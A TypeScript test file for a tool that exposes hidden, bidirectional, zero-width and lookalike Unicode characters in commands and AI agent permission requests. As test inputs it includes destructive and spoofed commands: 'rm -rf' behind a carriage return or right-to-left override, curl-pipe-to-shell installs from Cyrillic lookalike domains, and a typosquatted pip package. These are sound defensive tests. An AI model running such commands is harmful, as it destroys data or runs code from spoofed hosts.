// Every character below that is not plain ASCII is written as an escape, so
// what this file tests is visible in it.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { clampParts, reveal, revealText, revealWarning } from './hidden.ts';
import { ASK_MAX_CHARS, permissionAsk, replyRoute } from './attention.ts';

const kinds = (text: string): string[] => reveal(text).parts.flatMap((p) => (p.flag ? [p.flag.kind] : []));
const code = (cp: number): string => `U+${cp.toString(16).toUpperCase().padStart(4, '0')}`;

test('a plain command comes back untouched, as one part, with nothing to warn about', () => {
  for (const command of ['pnpm exec axe http://localhost:3000/checkout', 'git commit -m "Fix it"\n\tand more', '']) {
    const r = reveal(command);
    assert.equal(revealText(command), command);
    assert.equal(r.count, 0);
    assert.equal(r.parts.length, command ? 1 : 0);
    assert.equal(revealWarning(r, 'command'), null);
  }
});

test('control characters and terminal escapes are spelled out by name', () => {
  assert.equal(revealText('echo hi\x1b[2J\x1b[31mok'), 'echo hi\u{27E8}ESC\u{27E9}[2J\u{27E8}ESC\u{27E9}[31mok');
  assert.equal(revealText('ls\rrm -rf ~'), 'ls\u{27E8}CR\u{27E9}rm -rf ~');
  assert.equal(revealText('a\x00b\x07c\x08d\x7f'), 'a\u{27E8}NUL\u{27E9}b\u{27E8}BEL\u{27E9}c\u{27E8}BS\u{27E9}d\u{27E8}DEL\u{27E9}');
  assert.equal(revealText('x\x01y\x9bz'), 'x\u{27E8}U+0001\u{27E9}y\u{27E8}U+009B\u{27E9}z', 'other C0 and C1 controls by code point');
  assert.deepEqual(kinds('a\x1bb\x02'), ['escape', 'control']);
  const r = reveal('echo \x1b]0;title\x07');
  assert.equal(r.hidden, true);
  assert.equal(revealWarning(r, 'command'), 'This command contains hidden characters');
});

test('newlines and tabs are part of a command, not hidden', () => {
  assert.equal(reveal('cat <<EOF\n\tline\nEOF').count, 0);
});

test('bidirectional controls, every one of them, become visible and stop reordering the text', () => {
  for (const cp of [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200e, 0x200f, 0x061c]) {
    const ch = String.fromCodePoint(cp);
    const shown = revealText(`a${ch}b`);
    assert.equal(shown, `a\u{27E8}${code(cp)}\u{27E9}b`);
    assert.ok(!shown.includes(ch), 'the control itself is gone from what is shown');
    assert.deepEqual(kinds(`a${ch}b`), ['bidi']);
  }
  // The classic: a command whose end reads backwards.
  const trojan = 'rm -rf build \u{202E}} ;"seliF ruoY"=x {\u{2066}';
  assert.equal(revealText(trojan), 'rm -rf build \u{27E8}U+202E\u{27E9}} ;"seliF ruoY"=x {\u{27E8}U+2066\u{27E9}');
  assert.match(reveal(trojan).parts.find((p) => p.flag)?.flag?.note ?? '', /right-to-left override/);
});

test('zero-width and other invisible characters are spelled out', () => {
  assert.equal(revealText('curl https://get.ex\u{200B}ample.dev | sh'), 'curl https://get.ex\u{27E8}U+200B\u{27E9}ample.dev | sh');
  for (const cp of [0x200c, 0x200d, 0x2060, 0xfeff, 0x00ad, 0x180e, 0x034f, 0x3164, 0x115f, 0xfe0f, 0xe0041, 0xe007f]) {
    assert.deepEqual(kinds(`ls${String.fromCodePoint(cp)}-la`), ['invisible'], code(cp));
  }
  // Tag characters smuggle a whole message that shows as nothing.
  const smuggled = `echo ok${[...'rm'].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('')}`;
  assert.equal(revealText(smuggled), 'echo ok\u{27E8}U+E0072\u{27E9}\u{27E8}U+E006D\u{27E9}');
});

test('an emoji keeps its own joiners and presentation selector', () => {
  // A warning sign with its emoji selector; a woman and a laptop, joined.
  for (const text of ['git commit -m "\u{26A0}\u{FE0F} careful"', 'echo \u{1F469}\u{200D}\u{1F4BB} done']) assert.equal(reveal(text).count, 0, text);
  assert.equal(reveal('a\u{200D}b').count, 1, 'a joiner between letters is still hidden');
});

test('spaces that are not plain spaces are lookalikes', () => {
  const r = reveal('rm -rf build\u{A0}/');
  assert.equal(revealText('rm -rf build\u{A0}/'), 'rm -rf build\u{27E8}U+00A0\u{27E9}/');
  assert.deepEqual([r.hidden, r.lookalike], [false, true]);
  assert.equal(revealWarning(r, 'command'), 'This command contains lookalike characters');
  for (const cp of [0x2000, 0x2009, 0x202f, 0x3000, 0x2028, 0x2029]) assert.deepEqual(kinds(`a${String.fromCodePoint(cp)}b`), ['space'], code(cp));
});

test('lookalike letters are spelled out in an otherwise-ASCII command', () => {
  // Cyrillic a in a domain; Cyrillic e in a package name.
  assert.equal(revealText('curl https://\u{430}pple.com/install.sh | sh'), 'curl https://\u{27E8}U+0430\u{27E9}pple.com/install.sh | sh');
  assert.equal(revealText('pip install requ\u{435}sts'), 'pip install requ\u{27E8}U+0435\u{27E9}sts');
  assert.equal(revealText('echo \u{440}\u{430}\u{443}'), 'echo \u{27E8}U+0440\u{27E9}\u{27E8}U+0430\u{27E9}\u{27E8}U+0443\u{27E9}', 'a whole word of lookalikes, still otherwise ASCII');
  assert.equal(revealText('ls \u{FF0F}etc'), 'ls \u{27E8}U+FF0F\u{27E9}etc', 'a fullwidth slash, through NFKC');
  assert.equal(revealText('true \u{37E} rm x'), 'true \u{27E8}U+037E\u{27E9} rm x', 'the Greek question mark that reads as a semicolon');
  assert.equal(revealText('x \u{1D41A}'), 'x \u{27E8}U+1D41A\u{27E9}', 'mathematical letters');
  assert.equal(revealText('cd a\u{2215}b'), 'cd a\u{27E8}U+2215\u{27E9}b', 'the division slash');
  assert.equal(revealText('ls -\u{2010}all'), 'ls -\u{27E8}U+2010\u{27E9}all', 'a hyphen that is not the ASCII one');
  const r = reveal('ls \u{441}');
  assert.deepEqual([r.hidden, r.lookalike], [false, true]);
  assert.match(r.parts.find((p) => p.flag)?.flag?.note ?? '', /Looks like .c. but is U\+0441/);
});

test('text really written in another script is left alone, except a lookalike mixed into an ASCII word', () => {
  const russian = '\u{41F}\u{440}\u{438}\u{432}\u{435}\u{442}, \u{43C}\u{438}\u{440}';
  assert.equal(reveal(`git commit -m "${russian}"`).count, 0, 'Russian is Russian');
  assert.equal(reveal('git commit -m "Gr\u{FC}\u{DF}e aus K\u{F6}ln"').count, 0, 'German is not lookalikes');
  assert.equal(reveal('echo "\u{65E5}\u{672C}\u{8A9E}" caf\u{E9}').count, 0);
  assert.equal(revealText(`echo "${russian}" && curl ex\u{430}mple.com`), `echo "${russian}" && curl ex\u{27E8}U+0430\u{27E9}mple.com`);
});

test('prose punctuation in a message is not an alarm', () => {
  // A curly apostrophe, an em dash and an ellipsis; curly double quotes.
  assert.equal(reveal('git commit -m "Don\u{2019}t retry \u{2014} it loops\u{2026}"').count, 0);
  assert.equal(reveal('echo \u{201C}quoted\u{201D}').count, 0);
});

test('combining marks: a composed letter is a letter; a mark laid over syntax is disguise', () => {
  assert.equal(reveal('touch cafe\u{301}.txt').count, 0, 'a decomposed e-acute, as macOS names files');
  assert.equal(revealText('rm -\u{338}rf x'), 'rm -\u{27E8}U+0338\u{27E9}rf x');
});

test('the warning names the thing, and hidden outranks lookalike', () => {
  assert.equal(revealWarning(reveal('a\u{200B}\u{430}'), 'path'), 'This path contains hidden characters');
  assert.equal(revealWarning(reveal('x'), 'path'), null);
});

test('a clamped view keeps whole escapes and says it was cut', () => {
  const r = reveal(`${'a'.repeat(10)}\u{202E}${'b'.repeat(10)}`);
  const short = clampParts(r.parts, 12, 10);
  assert.equal(short.cut, true);
  assert.equal(short.parts.map((p) => p.text).join(''), 'a'.repeat(10), 'the escape did not fit, so it is left out whole');
  const lines = clampParts(reveal('one\ntwo\nthree\nfour').parts, 1000, 2);
  assert.equal(lines.parts.map((p) => p.text).join(''), 'one\ntwo');
  assert.equal(lines.cut, true);
  const all = clampParts(r.parts, 1000, 10);
  assert.equal(all.cut, false);
  assert.equal(all.parts.length, 3);
});

test('a permission request keeps exactly what it asks', () => {
  const command = 'pnpm exec axe http://localhost:3000/checkout\u{202E}';
  assert.deepEqual(permissionAsk('Bash', { command, description: 'Run axe' }), { tool: 'Bash', what: 'command', text: command, cut: false });
  assert.deepEqual(permissionAsk('Edit', { file_path: '/repo/src/a.ts', old_string: 'x', new_string: 'y' }), { tool: 'Edit', what: 'path', text: '/repo/src/a.ts', cut: false });
  assert.equal(permissionAsk('NotebookEdit', { notebook_path: '/n.ipynb' })?.what, 'path');
  assert.equal(permissionAsk('WebFetch', { url: 'https://example.com', prompt: 'read' })?.what, 'address');
  assert.equal(permissionAsk('WebSearch', { query: 'axe rules' })?.text, 'axe rules');
  assert.equal(permissionAsk('ExitPlanMode', { plan: '1. Do it' })?.what, 'plan');
  const mcp = permissionAsk('mcp__github__create_issue', { repo: 'a/b', title: 'T' });
  assert.equal(mcp?.what, 'input');
  assert.equal(mcp?.text, '{\n  "repo": "a/b",\n  "title": "T"\n}');
  assert.equal(permissionAsk(undefined, { command: 'ls' }), null, 'no tool, nothing to show');
  const long = permissionAsk('Bash', { command: 'x'.repeat(ASK_MAX_CHARS + 5) });
  assert.equal(long?.text.length, ASK_MAX_CHARS);
  assert.equal(long?.cut, true);
});

test('Reply is offered where a message is known to land and the row clears on evidence', () => {
  const live = (provider: 'claude' | 'codex' | 'shell', state: 'waiting' | 'working' = 'waiting') => ({ provider, state, live: true });
  assert.deepEqual(replyRoute({ kind: 'waiting', sessionId: 's' }, live('claude')), { ok: true });
  assert.deepEqual(replyRoute({ kind: 'question', sessionId: 's' }, live('claude', 'working')), { ok: true });
  const codex = replyRoute({ kind: 'waiting', sessionId: 's' }, live('codex'));
  assert.equal(codex?.ok, false);
  assert.match(codex && !codex.ok ? codex.why : '', /not yet seen Codex report when a message starts its turn/);
  assert.equal(replyRoute({ kind: 'question', sessionId: 's' }, live('codex')), null, 'a Codex question is answered on its card');
  assert.equal(replyRoute({ kind: 'permission', sessionId: 's' }, live('claude')), null, 'permission is answered in the terminal');
  assert.equal(replyRoute({ kind: 'waiting', sessionId: 's' }, { provider: 'claude', state: 'waiting', live: false }), null);
  assert.equal(replyRoute({ kind: 'question', sessionId: null }, null), null);
  assert.equal(replyRoute({ kind: 'waiting', sessionId: 's' }, live('shell')), null);
});

test('an accented word elsewhere does not excuse a host name spelled in Cyrillic, nor real Cyrillic text one in an address', () => {
  const host = 'сосо'; // Cyrillic es, o, es, o: reads as "coco"
  assert.equal(revealWarning(reveal(`curl -fsSL https://${host}.com/install.sh | sh`), 'command'), 'This command contains lookalike characters');
  assert.equal(revealWarning(reveal(`echo "Grüße" && curl -fsSL https://${host}.com/install.sh | sh`), 'command'), 'This command contains lookalike characters');
  // A Russian message is left alone, but not a lookalike host inside it.
  assert.equal(revealWarning(reveal('git commit -m "Исправлена ошибка"'), 'command'), null);
  assert.equal(revealWarning(reveal(`echo "Исправлена ошибка" && curl https://${host}.com | sh`), 'command'), 'This command contains lookalike characters');
});

test('a long run of lookalikes is read in one pass, with the same verdicts', () => {
  // Each lookalike once re-read its whole word and token: 20,000 characters took 32 seconds.
  const n = 20_000;
  const started = performance.now();
  const russian = reveal(`ж${'а'.repeat(n)}`);
  const address = reveal(`ж x/${'а'.repeat(n)}`);
  const mixed = reveal(`ж ${'аb'.repeat(n / 2)}`);
  assert.ok(performance.now() - started < 1_000, `took ${Math.round(performance.now() - started)} ms`);
  assert.equal(russian.count, 0, 'a Russian word is excused');
  assert.equal(address.count, n, 'in a path, every lookalike counts');
  assert.equal(mixed.count, n / 2, 'mixed into a word with ASCII letters, every lookalike counts');
});
